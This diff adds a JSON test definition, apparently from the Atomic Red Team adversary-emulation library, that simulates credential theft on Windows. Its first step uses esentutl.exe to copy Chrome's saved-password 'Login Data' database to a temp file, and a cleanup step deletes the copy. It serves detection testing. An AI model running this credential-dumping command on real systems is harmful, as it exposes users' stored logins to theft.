@@ -1,0 +1,105 @@
+{
+  "id": "70422253-8198-4019-b617-6be401b49fce",
+  "name": "Dump Chrome Login Data with esentutl",
+  "description": "This test simulates an adversary using esentutl to dump encrypted credentials from Google Chrome's Login database.\n[Reference](https://actzero.ai/resources/blog/hygiene-tip-shut-down-attackers-harvesting-cached-browser-credentials/)\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "da7c0907-ae9b-4be2-8757-0402d01ea79a",
+      "type": "execute-command",
+      "data": {
+        "command": "esentutl.exe /y \"%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data\" /d \"#{output_path}\"\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "fe5405ac-56f0-4cc3-9d40-8090dc91e9c0",
+      "type": "execute-command",
+      "data": {
+        "command": "del /f /q #{output_path} \u003e nul 2\u003e\u00261\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "b7b5c216-2756-4966-b27f-de192ba710f6",
+      "name": "Check dependency 1/1",
+      "description": "Chrome must be installed\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if ((Test-Path \"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\") -Or (Test-Path \"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\")) {exit 0} else {exit 1}",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "b58965ca-bbee-4162-9af5-9eb0e945219c",
+      "name": "Resolve dependency 1/1",
+      "description": "Chrome must be installed\n",
+      "type": "execute-command",
+      "data": {
+        "command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\n$installer = \"PathToAtomicsFolder\\..\\ExternalPayloads\\ChromeStandaloneSetup64.msi\"\nInvoke-WebRequest -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\ChromeStandaloneSetup64.msi\" https://dl.google.com/chrome/install/googlechromestandaloneenterprise64.msi\nmsiexec /i $installer /qn\nStart-Process -FilePath \"chrome.exe\"\nStop-Process -Name \"chrome\"\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "226d5c55-acbd-4988-bd67-c13780bdd464",
+      "name": "Re-check dependency 1/1",
+      "description": "Chrome must be installed\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if ((Test-Path \"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\") -Or (Test-Path \"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\")) {exit 0} else {exit 1}",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "da7c0907-ae9b-4be2-8757-0402d01ea79a",
+      "p": "on-success",
+      "o": "fe5405ac-56f0-4cc3-9d40-8090dc91e9c0"
+    },
+    {
+      "s": "da7c0907-ae9b-4be2-8757-0402d01ea79a",
+      "p": "on-failure",
+      "o": "fe5405ac-56f0-4cc3-9d40-8090dc91e9c0"
+    },
+    {
+      "s": "b7b5c216-2756-4966-b27f-de192ba710f6",
+      "p": "on-success",
+      "o": "da7c0907-ae9b-4be2-8757-0402d01ea79a"
+    },
+    {
+      "s": "b7b5c216-2756-4966-b27f-de192ba710f6",
+      "p": "on-failure",
+      "o": "b58965ca-bbee-4162-9af5-9eb0e945219c"
+    },
+    {
+      "s": "b58965ca-bbee-4162-9af5-9eb0e945219c",
+      "p": "on-success",
+      "o": "226d5c55-acbd-4988-bd67-c13780bdd464"
+    },
+    {
+      "s": "226d5c55-acbd-4988-bd67-c13780bdd464",
+      "p": "on-failure",
+      "o": "da7c0907-ae9b-4be2-8757-0402d01ea79a"
+    }
+  ],
+  "tags": [
+    "T1555.003",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "output_path",
+      "type": "string",
+      "description": "File path for login data dump",
+      "value": "%temp%\\T1555.003_Login_Data.tmp"
+    }
+  ]
+}
